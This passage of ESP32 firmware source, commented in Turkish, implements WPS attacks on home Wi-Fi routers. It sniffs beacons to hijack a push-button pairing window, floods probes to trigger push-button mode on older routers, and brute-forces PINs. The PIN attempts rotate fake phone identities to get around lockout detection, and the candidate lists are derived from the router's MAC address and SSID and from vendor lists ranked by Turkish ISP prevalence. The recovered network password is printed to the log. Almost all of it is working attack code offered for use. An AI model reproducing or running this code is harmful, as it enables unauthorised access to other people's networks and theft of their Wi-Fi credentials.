  pbc_probe_rotating(bssid, ssid, ch, pbc_burst_rot_idx++);
  if (pbc_burst_rot_idx > 250) pbc_burst_rot_idx = 0;
}

// ─── PBC beacon izleyici — birileri butona bastı mı? ─────────────────────────
// Selected Registrar=1 + Device Password ID=PBC(0x0004) kombinasyonunu arar.
// Bu iki alan aynı anda set edilmişse AP WPS PBC moduna girmiştir.
static volatile bool    pbc_detected        = false;
static const uint8_t   *pbc_watch_bssid     = nullptr;
static const uint8_t    WPS_OUI_PBC[4]      = {0x00, 0x50, 0xF2, 0x04};

static void IRAM_ATTR pbc_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (pbc_detected || !pbc_watch_bssid) return;
  if (type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t *raw  = (wifi_promiscuous_pkt_t *)buf;
  const uint8_t *pl  = raw->payload;
  int            plen = raw->rx_ctrl.sig_len;

  if (plen < 38) return;
  uint8_t sub = (pl[0] >> 4) & 0x0F;
  if (sub != 8 && sub != 5) return; // sadece Beacon(8) ve Probe Response(5)
  if (memcmp(pl + 16, pbc_watch_bssid, 6) != 0) return;

  const uint8_t *ie    = pl + 36;
  int            ielen = plen - 36;
  int            pos   = 0;

  while (pos + 2 <= ielen) {
    uint8_t ie_id = ie[pos], ie_sz = ie[pos+1];
    pos += 2;
    if (pos + ie_sz > ielen) break;

    if (ie_id == 221 && ie_sz >= 4 && memcmp(ie+pos, WPS_OUI_PBC, 4) == 0) {
      const uint8_t *tlv = ie + pos + 4;
      int tlen = ie_sz - 4, ti = 0;
      bool sel_reg = false;
      uint16_t dpw = 0xFFFF;

      while (ti + 4 <= tlen) {
        uint16_t attr = ((uint16_t)tlv[ti]<<8)|tlv[ti+1];
        uint16_t alen = ((uint16_t)tlv[ti+2]<<8)|tlv[ti+3];
        ti += 4;
        if (ti + alen > tlen) break;
        if (attr == 0x1041 && alen >= 1) sel_reg = (tlv[ti] != 0);   // Selected Registrar
        if (attr == 0x1012 && alen >= 2) dpw = ((uint16_t)tlv[ti]<<8)|tlv[ti+1]; // Dev PW ID
        ti += alen;
      }
      // Hem Selected Registrar = 1 hem de Device Password ID = PBC (0x0004) gerekli
      if (sel_reg && dpw == 0x0004) pbc_detected = true;
    }
    pos += ie_sz;
  }
}

// ─── PBC izleme + otomatik bağlantı (PUBLIC) ─────────────────────────────────
// İki aşamalı:
//   1. Beacon izleme sırasında aynı anda PBC probe'lar gönderilir.
//      - Bazı eski AP'ler (Ralink/MediaTek) probe'a yanıt olarak PBC açar.
//      - Modern AP'lerde kullanıcının fiziksel butona basması beklenir.
//   2. AP'nin beacon'ında Selected Registrar=1 + PBC tespit edilince
//      derhal WPS_TYPE_PBC ile bağlantı kurulur ve şifre alınır.
// Döndürür: true = şifre başarıyla alındı
bool wps_pbc_monitor_attack(int target_index, uint32_t timeout_ms) {
  if (target_index < 0 || target_index >= wps_target_count) return false;
  const wps_target_t &tgt = wps_targets[target_index];

  DEBUG_PRINTF("PBC izleme basliyor: %s kanal=%d timeout=%lus\n",
    tgt.ssid, tgt.channel, (unsigned long)(timeout_ms/1000));

  pbc_detected     = false;
  pbc_watch_bssid  = tgt.bssid;

  esp_wifi_set_channel((uint8_t)tgt.channel, WIFI_SECOND_CHAN_NONE);
  wifi_promiscuous_filter_t mf = { WIFI_PROMIS_FILTER_MASK_MGMT };
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&mf);
  esp_wifi_set_promiscuous_rx_cb(&pbc_sniffer_cb);

  unsigned long deadline = millis() + timeout_ms;
  unsigned long last_probe = 0;
  while (!pbc_detected && millis() < deadline) {
    // Her 500ms'de bir PBC probe gönder
    if (millis() - last_probe >= 500) {
      wps_pbc_probe_burst(tgt.bssid, tgt.ssid, tgt.channel);
      last_probe = millis();
    }
    delay(20);
  }

  esp_wifi_set_promiscuous(false);
  pbc_watch_bssid = nullptr;
  delay(200);

  if (!pbc_detected) {
    DEBUG_PRINTLN("PBC: Zaman asimi — buton basilmadi veya AP desteklemiyor.");
    return false;
  }

  DEBUG_PRINTLN("PBC MOD AKTIF! Hemen baglaniyor...");

  // WPS PBC bağlantısı
  wifi_config_t sta = {};
  memcpy(sta.sta.bssid, tgt.bssid, 6);
  sta.sta.bssid_set = 1;
  sta.sta.channel   = (uint8_t)tgt.channel;
  esp_wifi_set_config(WIFI_IF_STA, &sta);

  esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
  // PBC için cihaz profili — ilk profili kullan (Samsung Galaxy)
  strncpy(cfg.factory_info.manufacturer, DEVICE_PROFILES[0].manufacturer,
          sizeof(cfg.factory_info.manufacturer)-1);
  strncpy(cfg.factory_info.model_name,   DEVICE_PROFILES[0].model_name,
          sizeof(cfg.factory_info.model_name)-1);
  strncpy(cfg.factory_info.device_name,  DEVICE_PROFILES[0].device_name,
          sizeof(cfg.factory_info.device_name)-1);

  wps_evt_result = 0;
  ensure_handler();

  if (esp_wifi_wps_enable(&cfg)  != ESP_OK) return false;
  if (esp_wifi_wps_start(0)      != ESP_OK) { esp_wifi_wps_disable(); return false; }

  // PBC handshake maksimum 120 saniye sürebilir
  unsigned long t0 = millis();
  while (wps_evt_result == 0 && millis() - t0 < 120000UL) delay(50);
  esp_wifi_wps_disable();

  if (wps_evt_result != 1) {
    DEBUG_PRINTLN("PBC baglantisi basarisiz.");
    return false;
  }

  wifi_config_t got = {};
  esp_wifi_get_config(WIFI_IF_STA, &got);
  strncpy(wps_found_ssid, (char *)got.sta.ssid,     32);
  strncpy(wps_found_pass, (char *)got.sta.password,  64);
  snprintf(wps_found_pin, sizeof(wps_found_pin), "PBC");
  wps_attack_state = WPS_SUCCESS;

  DEBUG_PRINTF("PBC BASARI! SSID=%s SIFRE=%s\n", wps_found_ssid, wps_found_pass);
  return true;
}

// ─── PBC probe flood (PUBLIC) ─────────────────────────────────────────────────
// Eski/zafiyetli AP'lere karşı: art arda PBC probe'ları gönderir.
// Ralink RT5350 ve MediaTek MT7620 tabanlı modemlerde PBC modunu tetikleyebilir.
void wps_pbc_flood(int target_index, int count) {
  if (target_index < 0 || target_index >= wps_target_count) return;
  const wps_target_t &tgt = wps_targets[target_index];
  DEBUG_PRINTF("PBC flood: %d probe → %s\n", count, tgt.ssid);
  for (int i = 0; i < count && i < 200; i++) {
    wps_pbc_probe_burst(tgt.bssid, tgt.ssid, tgt.channel);
    delay(80);
  }
}

// ─── Cihaz profili tablosu — her denemede farklı bir cihaz kimliği göster ──────
// Bazı AP'ler aynı cihazdan gelen tekrarlayan WPS denemelerini engelliyor.
// Farklı üretici/model kombinasyonları bu tespiti zorlaştırır.
struct wps_device_profile_t {
  const char *manufacturer;
  const char *model_name;
  const char *device_name;
};
static const wps_device_profile_t DEVICE_PROFILES[] = {
  {"Samsung",   "Galaxy",      "SM-G998B"},
  {"Samsung",   "Galaxy",      "SM-S918B"},
  {"Apple",     "iPhone",      "iPhone14,3"},
  {"Apple",     "iPhone",      "iPhone15,3"},
  {"Xiaomi",    "Redmi",       "23049PCD8G"},
  {"Huawei",    "P60 Pro",     "MAL-LX9"},
  {"OPPO",      "Find X6",     "PGEM10"},
  {"OnePlus",   "11",          "PHB110"},
  {"Realme",    "GT5",         "RMX3709"},
  {"Sony",      "Xperia 1 V",  "XQ-DQ54"},
  {"Google",    "Pixel 8",     "shiba"},
  {"LG",        "Wing",        "LMF100N"},
  {"Motorola",  "Edge 40 Pro", "XT2301-5"},
  {"Nokia",     "G60",         "TA-1404"},
  {"Vivo",      "X90 Pro",     "V2227A"},
};
static const int DEVICE_PROFILE_COUNT = (int)(sizeof(DEVICE_PROFILES) / sizeof(DEVICE_PROFILES[0]));
static int  wps_profile_idx = 0;

// ─── Tek PIN denemesi ──────────────────────────────────────────────────────────
// Döndürür: 1=başarı, -1=başarısız/NACK, 0=zaman aşımı
// Adaptif timeout: AP hızına göre 1.0s–5s arası otomatik ayarlanır.
// Hızlı NACK (<600ms) → timeout düşer → sonraki denemeler daha hızlı.
// Her denemede farklı bir cihaz profili kullanılır (tespiti zorlaştırır).
static int8_t wps_try_one(const uint8_t *bssid, int channel, const char *pin) {
  wps_evt_result = 0;
  ensure_handler();

  wifi_config_t sta = {};
  memcpy(sta.sta.bssid, bssid, 6);
  sta.sta.bssid_set = 1;
  sta.sta.channel   = (uint8_t)channel;
  esp_wifi_set_config(WIFI_IF_STA, &sta);

  // Her denemede farklı cihaz profili — AP aynı cihazı tanımasın
  const wps_device_profile_t &prof = DEVICE_PROFILES[wps_profile_idx % DEVICE_PROFILE_COUNT];
  wps_profile_idx++;

  esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PIN);
  strncpy(cfg.factory_info.manufacturer, prof.manufacturer, sizeof(cfg.factory_info.manufacturer) - 1);
  strncpy(cfg.factory_info.model_name,   prof.model_name,   sizeof(cfg.factory_info.model_name)   - 1);
  strncpy(cfg.factory_info.device_name,  prof.device_name,  sizeof(cfg.factory_info.device_name)  - 1);
  // Model numarası olarak PIN'i encode et — bazı AP uygulamaları bunu kontrol eder
  strncpy(cfg.factory_info.model_number, pin, sizeof(cfg.factory_info.model_number) - 1);

  DEBUG_PRINTF("WPS try: PIN=%s profil=%s %s\n", pin, prof.manufacturer, prof.model_name);

  if (esp_wifi_wps_enable(&cfg) != ESP_OK)  return 0;
  if (esp_wifi_wps_start(0)     != ESP_OK)  { esp_wifi_wps_disable(); return 0; }

  unsigned long start    = millis();
  unsigned long deadline = start + wps_adaptive_timeout;

  while (wps_evt_result == 0 && millis() < deadline) {
    web_interface_handle_client();
    delay(8);  // 10ms → 8ms: biraz daha sık kontrol
  }

  unsigned long elapsed = millis() - start;
  esp_wifi_wps_disable();
  esp_wifi_disconnect();

  // ── Adaptif timeout güncelleme ───────────────────────────────────────────
  // AP hızlı NACK verdiyse (< %30 timeout) → timeout'u küçült
  // Yavaş cevap verdiyse → yavaşça büyüt, üst sınırı aşma
  if (wps_evt_result != 0) {
    // Cevap geldi: süreyi baz alarak adapte et (EWMA %50)
    uint32_t target = (uint32_t)(elapsed * 2 + 200); // 2x geçen süre + buffer
    target = max((uint32_t)WPS_PIN_TIMEOUT_MIN_MS, min(target, (uint32_t)WPS_PIN_TIMEOUT_MS));
    wps_adaptive_timeout = (wps_adaptive_timeout + target) / 2;
  } else {
    // Zaman aşımı: AP yavaş, timeout'u artır
    if (wps_adaptive_timeout < (uint32_t)WPS_PIN_TIMEOUT_MS)
      wps_adaptive_timeout = min(wps_adaptive_timeout + 400, (uint32_t)WPS_PIN_TIMEOUT_MS);
  }

  if (wps_evt_result == 0) return 0;   // zaman aşımı
  return wps_evt_result;
}

// ─── SSID'den PIN adayları türet ─────────────────────────────────────────────
// Birçok ISP modemi SSID'ye son 3 MAC byte'ını hex olarak yazar.
// Örn: "ZTE_A1B2C3" → 0xA1B2C3 → decimal → PIN adayı
// Örn: "TTNET_1234567" → rakam kısmı → PIN adayı
// BSSID ±1 varyantları da eklenir: bazı vendor'lar WPS MAC = SSID MAC ± 1 kullanır.
int wps_ssid_to_pins(const char *ssid, const uint8_t *bssid,
                     char pins[][9], int max_pins) {
  if (!ssid || ssid[0] == '\0' || max_pins <= 0) return 0;
  int count = 0;

  auto sadd = [&](uint32_t v) {
    if (count >= max_pins) return;
    make_pin(v % 10000000UL, pins[count++]);
  };

  // 1. Son ayraçtan (_, -, .) sonraki bölümü bul
  int slen = strlen(ssid);
  const char *suffix = nullptr;
  for (int i = slen - 1; i >= 0; i--) {
    if (ssid[i] == '_' || ssid[i] == '-' || ssid[i] == '.') {
      suffix = ssid + i + 1;
      break;
    }
  }
  if (suffix && strlen(suffix) >= 4) {
    int suflen = strlen(suffix);
    // Hex mi?
    bool all_hex = true;
    for (int i = 0; i < suflen; i++) {
      if (!isxdigit((uint8_t)suffix[i])) { all_hex = false; break; }
    }
    if (all_hex && suflen >= 4) {
      unsigned long hv = strtoul(suffix, nullptr, 16);
      sadd((uint32_t)(hv % 10000000UL));
    }
    // Sayısal mı?
    bool all_dec = true;
    for (int i = 0; i < suflen; i++) {
      if (!isdigit((uint8_t)suffix[i])) { all_dec = false; break; }
    }
    if (all_dec && suflen >= 5) {
      unsigned long dv = strtoul(suffix, nullptr, 10);
      sadd((uint32_t)(dv % 10000000UL));
    }
  }

  // 2. SSID içindeki en uzun ardışık rakam kümesi
  int best_start = -1, best_len = 0, cur_start = -1, cur_len = 0;
  for (int i = 0; ssid[i]; i++) {
    if (isdigit((uint8_t)ssid[i])) {
      if (cur_len == 0) cur_start = i;
      cur_len++;
      if (cur_len > best_len) { best_len = cur_len; best_start = cur_start; }
    } else {
      cur_len = 0;
    }
  }
  if (best_len >= 5 && best_start >= 0) {
    char tmp[16] = {};
    int cplen = (best_len < 15) ? best_len : 15;
    strncpy(tmp, ssid + best_start, cplen);
    unsigned long dv2 = strtoul(tmp, nullptr, 10);
    sadd((uint32_t)(dv2 % 10000000UL));
  }

  // 3. BSSID son 3 byte ± 1/2/3/4 (WPS MAC ≠ BSSID MAC varyantı)
  // Birçok vendor WPS yönetim MAC'ini yayın MAC'inden 1-4 offset ile kullanır
  uint32_t m24 = ((uint32_t)bssid[3] << 16)
               | ((uint32_t)bssid[4] <<  8)
               |  (uint32_t)bssid[5];
  sadd((m24 + 1) % 10000000UL);
  if (m24 > 0) sadd((m24 - 1 + 0x1000000UL) % 10000000UL);
  sadd((m24 + 2) % 10000000UL);
  if (m24 > 1) sadd((m24 - 2 + 0x1000000UL) % 10000000UL);
  sadd((m24 + 3) % 10000000UL);
  if (m24 > 2) sadd((m24 - 3 + 0x1000000UL) % 10000000UL);
  sadd((m24 + 4) % 10000000UL);
  if (m24 > 3) sadd((m24 - 4 + 0x1000000UL) % 10000000UL);

  // 4. Zhao XOR fold — çeşitli Çin OEM chipset'ler (Realtek, MediaTek)
  uint8_t z = bssid[0] ^ bssid[1] ^ bssid[2] ^ bssid[3] ^ bssid[4] ^ bssid[5];
  uint32_t zv = ((uint32_t)(bssid[3] ^ z) << 16)
              | ((uint32_t)(bssid[4] ^ z) <<  8)
              |  (uint32_t)(bssid[5] ^ z);
  sadd(zv % 10000000UL);

  // 5. SSID içindeki herhangi bir 6-10 haneli hex segment
  // Örn: "HUAWEI-A1B2C3" → 0xA1B2C3, "ZTE_001A2B3C" → 0x001A2B3C
  for (int si = 0; ssid[si]; si++) {
    if (!isxdigit((uint8_t)ssid[si])) continue;
    int hlen = 0;
    bool allhex = true;
    while (ssid[si + hlen] && isxdigit((uint8_t)ssid[si + hlen])) hlen++;
    if (allhex && hlen >= 6 && hlen <= 10) {
      char tmp[11] = {};
      strncpy(tmp, ssid + si, hlen < 10 ? hlen : 10);
      unsigned long hv = strtoul(tmp, nullptr, 16);
      sadd((uint32_t)(hv % 10000000UL));
    }
    si += (hlen > 0 ? hlen - 1 : 0);
  }

  // 6. SSID tüm büyük hex → küçük hex adayı
  // Örn: "WiFi_A1B2C3D4E5F6" → 0xA1B2C3D4E5F6 % 10^7
  {
    char hexonly[16] = {};
    int hc = 0;
    for (int i = 0; ssid[i] && hc < 15; i++)
      if (isxdigit((uint8_t)ssid[i])) hexonly[hc++] = ssid[i];
    if (hc >= 8) {
      unsigned long hv2 = strtoul(hexonly + hc - 8, nullptr, 16);
      sadd((uint32_t)(hv2 % 10000000UL));
    }
  }

  return count;
}

// ─── PIN listesi oluştur ──────────────────────────────────────────────────────
// Vendor PIN'leri önce gelir (istatistiksel olarak daha başarılı)
// VENDOR_UNKNOWN → tüm 33 vendor algoritması baştan sona denenir.
// Bilinen vendor → kendi PIN'leri + 14 çapraz VULN_HIGH vendor PIN'leri.
// En büyük senaryo: VENDOR_UNKNOWN → 33 × 30 = 990 vendor + 196 ortak + 60 serial/ssid
#define ALL_PINS_MAX  (33 * MAX_VENDOR_PINS_PER_VENDOR + COMMON_PIN_COUNT + 60)
static char all_pins[ALL_PINS_MAX][9];
static int  all_pin_count = 0;

// Tüm bilinen vendor enum değerleri — Türkiye pazar yaygınlığına göre sıralı.
// Bilinmeyen vendor saldırısında bu sırayla PIN üretilir; en yaygın vendor'lar önce gelir.
static const wps_vendor_t ALL_VENDORS[] = {
  // ── Tier-1: Türk Telekom/TTNet ana dağıtım modemleri (en yaygın) ─────────
  VENDOR_ZTE,         // #1 — ZXHN H108N/H168N/F660, TTNet VDSL/Fiber ★★★
  VENDOR_HUAWEI,      // #2 — HG8245/HG8247 ONT, TTNet/Superonline Fiber ★★
  VENDOR_SAGEMCOM,    // #3 — F@st 3686/3890, TTNet Fiber kutu modemi ★★★
  VENDOR_ARCADYAN,    // #4 — VGV752/VGV7519, Vodafone TR ana kutu ★★
  VENDOR_ZYXEL,       // #5 — VMG3312/AMG1302, Superonline/TTNet VDSL ★★

  // ── Tier-2: Yaygın tüketici ve operatör OEM'leri ─────────────────────────
  VENDOR_TPLINK,      // #6 — Archer/TL-WR/Deco, tüm operatörler + perakende ★★
  VENDOR_SERCOMM,     // #7 — Vodafone/Turkcell markalı OEM modem ★★
  VENDOR_GEMTEK,      // #8 — TTNet/Turkcell markalı OEM modem ★★
  VENDOR_TECHNICOLOR, // #9 — TG582/DGA4132, ISP dağıtımlı ★★
  VENDOR_TENDA,       // #10 — AC6/N301/F3, bütçe segment çok yaygın ★★
  VENDOR_TOTOLINK,    // #11 — N/AC serisi, Realtek chipset, kolay lokma ★★★

  // ── Tier-3: Orta yaygınlıkta tüketici ve ISP ekipmanı ────────────────────
  VENDOR_MERCUSYS,    // #12 — MW/MR serisi, TP-Link alt markası ★★
  VENDOR_DLINK,       // #13 — DIR/DWR/DSL-2750, Pixie Dust açığı ★★★
  VENDOR_NETGEAR,     // #14 — R6/R7/Nighthawk, Pixie Dust açığı ★★★
  VENDOR_ASUS,        // #15 — RT-AC/RT-AX/GT, oyuncu/ev premium ★
  VENDOR_SAGEM,       // #16 — F@st 1500/2604, eski TTNet ADSL dönemi ★★
  VENDOR_COMTREND,    // #17 — AR-5381/VR-3025, Ralink Pixie Dust ★★★
  VENDOR_COMPAL,      // #18 — CH7465/CH7466, ISP kablo OEM ★★
  VENDOR_CISCO,       // #19 — DPC3825/EPC3825, ISP kablo/fiber kutu ★

  // ── Tier-4: Düşük yaygınlıkta / niş segmentler ───────────────────────────
  VENDOR_ISKRATEL,    // #20 — Si2000/Innbox, bazı bölgesel ISP'ler ★
  VENDOR_XIAOMI,      // #21 — AX3200/4A/AC2100, büyüyen pazar payı ★
  VENDOR_ARRIS,       // #22 — SBG/TG, kablo altyapısı ★
  VENDOR_ACTIONTEC,   // #23 — GT701/MI424, nadir operatör dağıtımı ★
  VENDOR_LINKSYS,     // #24 — WRT/EA/MR, Cisco sonrası azalan pazar ★
  VENDOR_BELKIN,      // #25 — F7D/F9K ★★
  VENDOR_FRITZ,       // #26 — 7490/7590, Almanya'da yaygın ★
  VENDOR_DRAYTEK,     // #27 — Vigor serisi, SOHO/ISP ★★
  VENDOR_BILLION,     // #28 — BiPAC serisi, ISP OEM ★★★
  VENDOR_NETCOMM,     // #29 — NF/NL/NTC serisi ★★

  // ── Tier-5: Çok nadir / kurumsal / profesyonel ───────────────────────────
  VENDOR_BUFFALO,     // #30 — WHR/WSR, Japonya kökenli, Pixie Dust ★★★
  VENDOR_MIKROTIK,    // #31 — hAP/RB, SOHO/ISP altyapı ★
  VENDOR_NETIS,       // #32 — WF/N serisi, düşük kalite ★
  VENDOR_UBIQUITI,    // #33 — UniFi/airOS, nadiren WPS aktif ★
};
static const int ALL_VENDORS_COUNT = (int)(sizeof(ALL_VENDORS) / sizeof(ALL_VENDORS[0]));

// Yardımcı: bir vendor'ın PIN'lerini all_pins'e duplikat kontrolüyle ekle
static void add_vendor_pins(const uint8_t *bssid, wps_vendor_t v) {
  char vp[MAX_VENDOR_PINS_PER_VENDOR][9];
  int  vc = 0;
  vendor_pins(bssid, v, vp, vc);
  for (int i = 0; i < vc && all_pin_count < ALL_PINS_MAX; i++) {
    bool dup = false;
    for (int j = 0; j < all_pin_count; j++) {
      if (strncmp(all_pins[j], vp[i], 8) == 0) { dup = true; break; }
    }
    if (!dup) memcpy(all_pins[all_pin_count++], vp[i], 9);
  }
}

static void build_pin_list(const uint8_t *bssid, wps_vendor_t vendor) {
  all_pin_count = 0;

  // ── 1. ÖNCELİK: Serial numarasından türetilen PIN'ler (Pixie Dust kısayolu) ──
  // WPS beacon IE'den serial yakalandıysa, bu PIN'ler listede en başa girer.
  // ZTE H108N, Huawei HG, Sagemcom F@st gibi modemlerde direkt doğru PIN
  // gelebilir; brute force'tan önce denenmiş olur.
  if (wps_device_info.valid && wps_device_info.serial_number[0] != '\0') {
    char sp[12][9];
    int sc = wps_serial_to_pins(wps_device_info.serial_number, sp, 12);
    for (int i = 0; i < sc && all_pin_count < ALL_PINS_MAX; i++) {
      bool dup = false;
      for (int j = 0; j < all_pin_count; j++) {
        if (strncmp(all_pins[j], sp[i], 8) == 0) { dup = true; break; }
      }
      if (!dup) memcpy(all_pins[all_pin_count++], sp[i], 9);
    }
    DEBUG_PRINTF("Serial bazli PIN: %d aday eklendi (serial=%s)\n",
                 all_pin_count, wps_device_info.serial_number);
  }

  // ── 2. SSID analizinden türetilen PIN adayları ────────────────────────────
  // Statik SSID'ye erişmek için wps_targets'dan alınır.
  if (wps_tgt_idx >= 0 && wps_tgt_idx < wps_target_count) {
    const char *cur_ssid = wps_targets[wps_tgt_idx].ssid;
    if (cur_ssid[0] != '\0') {
      char sp[16][9];
      int sc = wps_ssid_to_pins(cur_ssid, bssid, sp, 16);
      for (int i = 0; i < sc && all_pin_count < ALL_PINS_MAX; i++) {
        bool dup = false;
        for (int j = 0; j < all_pin_count; j++) {
          if (strncmp(all_pins[j], sp[i], 8) == 0) { dup = true; break; }
        }
        if (!dup) memcpy(all_pins[all_pin_count++], sp[i], 9);
      }
      DEBUG_PRINTF("SSID bazli PIN: %d aday eklendi (ssid=%s)\n", sc, cur_ssid);
    }
  }

  // ── 3. Vendor'a özgü hesaplanmış PIN'ler ─────────────────────────────────
  if (vendor == VENDOR_UNKNOWN) {
    // Bilinmeyen vendor: tüm 33 vendor algoritmasını dene (Türkiye yaygınlık sırasıyla)
    for (int v = 0; v < ALL_VENDORS_COUNT; v++)
      add_vendor_pins(bssid, ALL_VENDORS[v]);
  } else {
    // Tespit edilen vendor: önce kendi PIN'leri
    add_vendor_pins(bssid, vendor);

    // ── 3b. Çapraz VULN_HIGH vendor PIN'leri ─────────────────────────────
    // Birçok ISP modemi farklı OUI'ye sahip olsa da aynı chipset PIN
    // algoritmasını kullanır (ZTE OEM / Sagemcom OEM / Huawei OEM yaygın).
    // Tespit edilen vendor hangisi olursa olsun, yüksek açıklı ISP vendor
    // PIN'leri de eklenir — duplicateler otomatik atlanır.
    static const wps_vendor_t CROSS_VENDORS[] = {
      // Türkiye ISP dağıtım modemleri — OEM olasılığı yüksek
      VENDOR_ZTE,         // TTNET VDSL/Fiber chipset, seri-PIN yaygın
      VENDOR_SAGEMCOM,    // TTNET Fiber F@st, MAC tabanlı PIN
      VENDOR_HUAWEI,      // TTNET/Superonline ONT, mac24 tabanlı
      VENDOR_ARCADYAN,    // Vodafone TR VGV OEM
      VENDOR_ZYXEL,       // Superonline VMG, mac24 tabanlı
      VENDOR_SERCOMM,     // Vodafone/Turkcell OEM
      VENDOR_GEMTEK,      // TTNet/Turkcell OEM
      VENDOR_TECHNICOLOR, // ISP dağıtımlı TG serisi
      // Tüketici yüksek açık vendor'lar
      VENDOR_DLINK,       // Pixie Dust açığı yüksek
      VENDOR_NETGEAR,     // Pixie Dust — E-S1=E-S2=0
      VENDOR_TOTOLINK,    // Realtek chipset, sabit PIN
      VENDOR_COMTREND,    // Ralink Pixie Dust
      VENDOR_BILLION,     // BiPAC sabit PIN
      VENDOR_BUFFALO,     // WZR Pixie Dust
    };
    static const int CROSS_COUNT = (int)(sizeof(CROSS_VENDORS) / sizeof(CROSS_VENDORS[0]));
    for (int i = 0; i < CROSS_COUNT; i++) {
      if (CROSS_VENDORS[i] != vendor)
        add_vendor_pins(bssid, CROSS_VENDORS[i]);
    }
  }

  // ── 4. Ortak/evrensel PIN'ler (duplikat kontrolüyle) ─────────────────────
  for (int i = 0; COMMON_PINS[i] && all_pin_count < ALL_PINS_MAX; i++) {
    bool dup = false;
    for (int j = 0; j < all_pin_count; j++) {
      if (strncmp(all_pins[j], COMMON_PINS[i], 8) == 0) { dup = true; break; }
    }
    if (!dup) memcpy(all_pins[all_pin_count++], COMMON_PINS[i], 9);
  }

  wps_total = all_pin_count;
}

// ─── WPS PBC Non-Blocking Durum Makinesi ─────────────────────────────────────
// main loop'tan wps_pbc_loop() her iterasyonda çağrılır — HTTP handler bloke olmaz.
//
//  IDLE ──(wps_pbc_start)──► MONITORING ──(pbc_detected)──► CONNECTING ──(evt=1)──► SUCCESS
//                                     └──(timeout)──► FAILED           └──(evt=-1/timeout)──► FAILED
//
wps_pbc_state_t wps_pbc_attack_state = WPS_PBC_IDLE;
int             wps_pbc_target_idx   = -1;
int             wps_pbc_probes_sent  = 0;
char            wps_pbc_found_ssid[33] = {};
char            wps_pbc_found_pass[65] = {};

static unsigned long pbc_sm_deadline      = 0;
static unsigned long pbc_sm_last_probe    = 0;
static bool          pbc_sm_wps_started   = false;
static unsigned long pbc_sm_connect_start = 0;

void wps_pbc_start(int target_idx, uint32_t timeout_ms) {
  if (target_idx < 0 || target_idx >= wps_target_count) return;
  if (wps_pbc_attack_state != WPS_PBC_IDLE) wps_pbc_stop();

  wps_pbc_target_idx    = target_idx;
  wps_pbc_probes_sent   = 0;
  pbc_sm_deadline       = millis() + timeout_ms;
  pbc_sm_last_probe     = 0;
  pbc_sm_wps_started    = false;
  pbc_detected          = false;
  pbc_watch_bssid       = wps_targets[target_idx].bssid;
  wps_pbc_found_ssid[0] = '\0';
  wps_pbc_found_pass[0] = '\0';

  const wps_target_t &tgt = wps_targets[target_idx];
  esp_wifi_set_channel((uint8_t)tgt.channel, WIFI_SECOND_CHAN_NONE);

  wifi_promiscuous_filter_t mf = { WIFI_PROMIS_FILTER_MASK_MGMT };
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&mf);
  esp_wifi_set_promiscuous_rx_cb(&pbc_sniffer_cb);

  wps_pbc_attack_state = WPS_PBC_MONITORING;
  DEBUG_PRINTF("PBC izleme baslatildi: %s kanal=%d zaman=%lus\n",
    tgt.ssid, tgt.channel, (unsigned long)(timeout_ms / 1000));
}

void wps_pbc_stop() {
  if (wps_pbc_attack_state == WPS_PBC_CONNECTING && pbc_sm_wps_started) {
    esp_wifi_wps_disable();
  }
  if (wps_pbc_attack_state == WPS_PBC_MONITORING) {
    esp_wifi_set_promiscuous(false);
  }
  pbc_watch_bssid      = nullptr;
  pbc_detected         = false;
  pbc_sm_wps_started   = false;
  wps_pbc_attack_state = WPS_PBC_IDLE;
  DEBUG_PRINTLN("PBC durduruldu.");
}

// Non-blocking loop — main loop'ta her iterasyonda çağrılır
void wps_pbc_loop() {
  if (wps_pbc_attack_state == WPS_PBC_MONITORING) {
    // Zaman aşımı kontrolü
    if (millis() > pbc_sm_deadline) {
      esp_wifi_set_promiscuous(false);
      pbc_watch_bssid      = nullptr;
      wps_pbc_attack_state = WPS_PBC_FAILED;
      DEBUG_PRINTLN("PBC: Zaman asimi — buton basilmadi.");
      return;
    }
    // Her 500ms'de bir PBC probe burst gönder (5 metot sırayla)
    if (millis() - pbc_sm_last_probe >= 500) {
      const wps_target_t &tgt = wps_targets[wps_pbc_target_idx];
      wps_pbc_probe_burst(tgt.bssid, tgt.ssid, tgt.channel);
      wps_pbc_probes_sent++;
      pbc_sm_last_probe = millis();
    }
    // AP beacon'ında Selected Registrar=1 + PBC tespit edildi mi?
    if (pbc_detected) {
      esp_wifi_set_promiscuous(false);
      pbc_watch_bssid = nullptr;
      delay(80);  // WiFi stack geçiş payı

      const wps_target_t &tgt = wps_targets[wps_pbc_target_idx];
      wifi_config_t sta = {};
      memcpy(sta.sta.bssid, tgt.bssid, 6);
      sta.sta.bssid_set = 1;
      sta.sta.channel   = (uint8_t)tgt.channel;
      esp_wifi_set_config(WIFI_IF_STA, &sta);

      esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
      strncpy(cfg.factory_info.manufacturer, DEVICE_PROFILES[0].manufacturer,
              sizeof(cfg.factory_info.manufacturer) - 1);
      strncpy(cfg.factory_info.model_name,   DEVICE_PROFILES[0].model_name,
              sizeof(cfg.factory_info.model_name)   - 1);
      strncpy(cfg.factory_info.device_name,  DEVICE_PROFILES[0].device_name,
              sizeof(cfg.factory_info.device_name)  - 1);

      wps_evt_result = 0;
      ensure_handler();

      if (esp_wifi_wps_enable(&cfg) == ESP_OK && esp_wifi_wps_start(0) == ESP_OK) {
        pbc_sm_wps_started   = true;
        pbc_sm_connect_start = millis();
        wps_pbc_attack_state = WPS_PBC_CONNECTING;
        DEBUG_PRINTLN("PBC tespit! WPS handshake baslatiliyor...");
      } else {
        esp_wifi_wps_disable();
        wps_pbc_attack_state = WPS_PBC_FAILED;
        DEBUG_PRINTLN("PBC: WPS enable basarisiz.");
      }
    }

  } else if (wps_pbc_attack_state == WPS_PBC_CONNECTING) {
    // Handshake zaman aşımı: 120 saniye
    if (millis() - pbc_sm_connect_start > 120000UL) {
      esp_wifi_wps_disable();
      pbc_sm_wps_started   = false;
      wps_pbc_attack_state = WPS_PBC_FAILED;
      DEBUG_PRINTLN("PBC handshake zaman asimi (120s).");
      return;
    }
    if (wps_evt_result == 1) {
      // Başarı — şifreyi al
      wifi_config_t got = {};
      esp_wifi_get_config(WIFI_IF_STA, &got);
